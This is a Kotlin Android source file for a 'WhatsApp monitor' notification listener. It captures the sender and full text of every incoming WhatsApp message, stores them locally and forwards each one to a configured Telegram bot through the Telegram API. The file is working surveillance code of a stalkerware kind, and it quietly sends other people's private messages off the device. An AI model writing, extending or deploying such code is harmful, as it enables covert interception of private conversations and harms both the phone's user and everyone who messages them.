package com.example.whatsappmonitor

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.Executors

class WhatsAppNotificationListener : NotificationListenerService() {
    private val executor = Executors.newSingleThreadExecutor()

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
        if ((sbn.notification.flags and Notification.FLAG_GROUP_SUMMARY) != 0) return

        val extras = sbn.notification.extras ?: return
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim().orEmpty()
        val text = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
            ?.takeIf { it.isNotBlank() }
            ?: extras.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()

        if (text.isBlank()) return
        val timestamp = sbn.postTime
        val key = "${pkg}_${sbn.key}_$timestamp"
        val prefs = getSharedPreferences("monitor_history", MODE_PRIVATE)
        if (prefs.getBoolean(key, false)) return
        prefs.edit().putBoolean(key, true).apply()

        val record = "WhatsApp\nمن: ${title.ifBlank { "غير معروف" }}\nالرسالة: $text"
        saveLocal(record, timestamp)

        val settings = getSharedPreferences("monitor_settings", MODE_PRIVATE)
        val token = settings.getString("bot_token", null) ?: return
        val chatId = settings.getString("chat_id", null) ?: return
        executor.execute { sendTelegram(token, chatId, record) }
    }

    private fun saveLocal(record: String, timestamp: Long) {
        val prefs = getSharedPreferences("monitor_history", MODE_PRIVATE)
        val old = prefs.getString("records", "").orEmpty()
        val updated = ("[$timestamp] $record\n---\n" + old).take(20000)
        prefs.edit().putString("records", updated).apply()
    }

    private fun sendTelegram(token: String, chatId: String, message: String) {
        var connection: HttpURLConnection? = null
        try {
            val url = URL("https://api.telegram.org/bot$token/sendMessage")
            connection = (url.openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                doOutput = true
                connectTimeout = 10000
                readTimeout = 10000
                setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            }
            val body = "chat_id=${enc(chatId)}&text=${enc(message)}"
            connection.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
            connection.inputStream.close()
        } catch (_: Exception) {
            // The notification remains saved locally if Telegram is unavailable.
        } finally {
            connection?.disconnect()
        }
    }

    private fun enc(value: String): String = URLEncoder.encode(value, "UTF-8")
}
